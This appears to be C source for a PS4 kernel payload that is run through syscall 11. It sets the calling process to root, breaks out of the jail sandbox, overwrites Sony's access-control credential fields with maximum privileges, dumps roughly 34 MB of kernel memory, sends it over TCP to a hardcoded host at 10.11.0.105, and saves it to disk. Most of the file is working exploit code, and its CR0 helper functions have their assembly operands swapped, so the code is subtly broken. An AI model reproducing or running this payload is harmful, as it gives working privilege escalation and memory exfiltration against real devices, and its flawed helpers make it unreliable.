#include <stdbool.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <kernel.h>
#include <libdbg.h>
#include <sceerror.h>
#include <scetypes.h>
#include <net.h>
#include <libhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/param.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/cdefs.h>
#include <errno.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/socket.h>

#define IP(a, b, c, d) (((a) << 0) + ((b) << 8) + ((c) << 16) + ((d) << 24))

struct filedesc {
	void *useless1[3];
	void *fd_rdir;
	void *fd_jdir;
};

struct proc {
	char useless[64];
	struct ucred *p_ucred;
	struct filedesc *p_fd;
};

struct thread {
	void *useless;
	struct proc *td_proc;
};

struct auditinfo_addr {
	char useless[184];
};

struct ucred {
	uint32_t useless1;
	uint32_t cr_uid;     // effective user id
	uint32_t cr_ruid;    // real user id
	uint32_t useless2;
	uint32_t useless3;
	uint32_t cr_rgid;    // real group id
	uint32_t useless4;
	void *useless5;
	void *useless6;
	void *cr_prison;     // jail(2)
	void *useless7;
	uint32_t useless8;
	void *useless9[2];
	void *useless10;
	struct auditinfo_addr useless11;
	uint32_t *cr_groups; // groups
	uint32_t useless12;
};

uint64_t __readmsr(unsigned long __register)
{
	unsigned long __edx;
	unsigned long __eax;
	__asm__("rdmsr" : "=d"(__edx), "=a"(__eax) : "c"(__register));
	return (((uint64_t)__edx) << 32) | (uint64_t)__eax;
}

#define X86_CR0_WP (1 << 16)
uint64_t cr0;

static inline __attribute__((always_inline)) uint64_t readCr0(void)
{
	__asm__ volatile ("movq %0, %%cr0" : "=r" (cr0) : : "memory");
	return cr0;
}

static inline __attribute__((always_inline)) void writeCr0(uint64_t cr0)
{
	__asm__ volatile("movq %%cr0, %0" : : "r" (cr0) : "memory");
}

void *dump;

volatile int g_debugSocket;
volatile int(*sys_sendto)(void *td, void *uap);

//FFFFFFFF82500520 sys_sendto

#define KERNEL_CHUNK_SIZE PAGE_SIZE

void prefault(void *address, size_t size) {
	uint64_t i;
	for (i = 0; i < size; i++) {
		volatile uint8_t c;
		(void)c;

		c = ((char *)address)[i];
	}
}

struct sendto_args {
	int	s;
	void *	buf;
	size_t	len;
	int	flags;
	void *	to;
	int	tolen;
};

int khax(struct thread* td, uint64_t* uap) {
	size_t(*kprintf)(const char* fmt, ...) = (void*)0xFFFFFFFF824CE1A0ULL;
	sys_sendto = (void*)0xFFFFFFFF82500520;
	kprintf("entering kthread\n");

	struct ucred* cred;
	struct filedesc* fd;

	fd = td->td_proc->p_fd;
	cred = td->td_proc->p_ucred;


	uint8_t* kernel_ptr = (uint8_t*)0xFFFFFFFF82200000;
	void* got_prison0 = (void*)0xFFFFFFFF82C58BF0;
	void** got_rootvnode = (void**)0xFFFFFFFF82FF8710;

	cred->cr_uid = 0;
	cred->cr_ruid = 0;
	cred->cr_rgid = 0;
	cred->cr_groups[0] = 0;

	cred->cr_prison = got_prison0;
	fd->fd_rdir = fd->fd_jdir = *got_rootvnode;

	// escalate ucred privs, needed for access to the filesystem ie* mounting & decrypting files
	void *td_ucred = *(void **)(((char *)td) + 304); // p_ucred == td_ucred

													 // sceSblACMgrIsSystemUcred
	uint64_t *sonyCred = (uint64_t *)(((char *)td_ucred) + 96);
	*sonyCred = 0xffffffffffffffff;

	// sceSblACMgrGetDeviceAccessType
	uint64_t *sceProcType = (uint64_t *)(((char *)td_ucred) + 88);
	*sceProcType = 0x3801000000000013; // Max access

									   // sceSblACMgrHasSceProcessCapability
	uint64_t *sceProcCap = (uint64_t *)(((char *)td_ucred) + 104);
	*sceProcCap = 0xffffffffffffffff; // Sce Process

	memcpy(dump, (void*)0xFFFFFE0000000000, 0x2200000);
	
	struct sendto_args args = { g_debugSocket, dump, 0x2200000, 0, NULL, 0 };

	sys_sendto(td, &args);

	kprintf("return to userland\n");

	return 0;
}

int createDebugSocket(int port)
{
	struct sockaddr_in server;
	server.sin_len = sizeof(server);
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = IP(10, 11, 0, 105);
	server.sin_port = sceNetHtons(port);
	memset(server.sin_zero, 0, sizeof(server.sin_zero));

	int sock = sceNetSocket("debug", AF_INET, SOCK_STREAM, 0);
	sceNetConnect(sock, (struct sockaddr *)&server, sizeof(server));
	int flag = 1;
	sceNetSetsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (char *)&flag, sizeof(int));

	return sock;
}

/* Main entry point of program*/
SceInt32 main(int argc, const char *const argv[])
{
	

	printf("getuid:%08X\n", getuid());

	printf("getpid:%08X\n", getpid());

	printf("creating debug socket on ip 10.11.0.105 port 9023\n");
	g_debugSocket = createDebugSocket(9023);
	printf("mapping dump\n");
	dump = mmap(NULL, 0x2200000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	printf("prefaulting dump\n");
	prefault(dump, 0x2200000);

	printf("dumping kernel\n");

	syscall(11, khax);

	printf("closing socket\n");
	
	sceNetSocketClose(g_debugSocket);
	
	int fd = open( "/data/kernel.bin", O_WRONLY | O_CREAT | O_TRUNC, 0777 );
    if ( fd < 0 )
    {
        printf( "failed to open kernel.bin inside /data/ : %08X", fd );
        return -1;
    }

    int ret = write( fd, dump, 0x2200000 );
    if ( ret < 0 )
    {
        printf("Failed to write\n");
    }

    close( fd );
	

}